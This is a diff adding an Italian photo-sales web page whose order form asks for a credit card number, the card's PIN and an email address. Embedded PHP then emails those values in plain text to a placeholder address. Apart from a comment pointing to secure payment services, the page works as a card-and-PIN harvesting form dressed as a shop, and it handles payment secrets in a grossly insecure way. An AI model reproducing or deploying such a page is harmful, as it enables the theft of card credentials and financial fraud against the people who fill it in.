@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vendita Foto</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+        }
+        .photo {
+            margin-bottom: 20px;
+        }
+        .photo img {
+            max-width: 100%;
+            height: auto;
+        }
+        .buy-button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background: #28a745;
+            color: #fff;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        .buy-button:hover {
+            background: #218838;
+        }
+        form {
+            margin-top: 20px;
+        }
+        input[type="text"], input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Vendita Foto</h1>
+
+        <div class="photo">
+            <img src="foto1.jpg" alt="Foto 1">
+            <a href="#" class="buy-button">Acquista per €10</a>
+        </div>
+
+        <div class="photo">
+            <img src="foto2.jpg" alt="Foto 2">
+            <a href="#" class="buy-button">Acquista per €10</a>
+        </div>
+
+        <form action="invia_dati.php" method="POST">
+            <h2>Inserisci i tuoi dati</h2>
+            <label for="card-number">Numero della Carta di Credito</label>
+            <input type="text" id="card-number" name="card_number" required>
+            
+            <label for="pin">PIN</label>
+            <input type="password" id="pin" name="pin" required>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" required>
+
+            <input type="submit" value="Invia">
+			<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $card_number = $_POST['card_number'];
+    $pin = $_POST['pin'];
+    $email = $_POST['email'];
+
+    // Qui dovresti usare un servizio di pagamento sicuro.
+    // Questo esempio si limita a inviare un'email con i dati.
+
+    $to = "tuaemail@example.com";
+    $subject = "Nuovo ordine foto";
+    $message = "Numero carta: $card_number\nPIN: $pin\nEmail: $email";
+    $headers = "From: no-reply@example.com";
+
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Ordine ricevuto! Controlla la tua email.";
+    } else {
+        echo "Errore nell'invio dell'ordine. Riprova più tardi.";
+    }
+} else {
+    echo "Accesso non autorizzato.";
+}
+?>
+
+        </form>
+    </div>
+</body>
+</html>
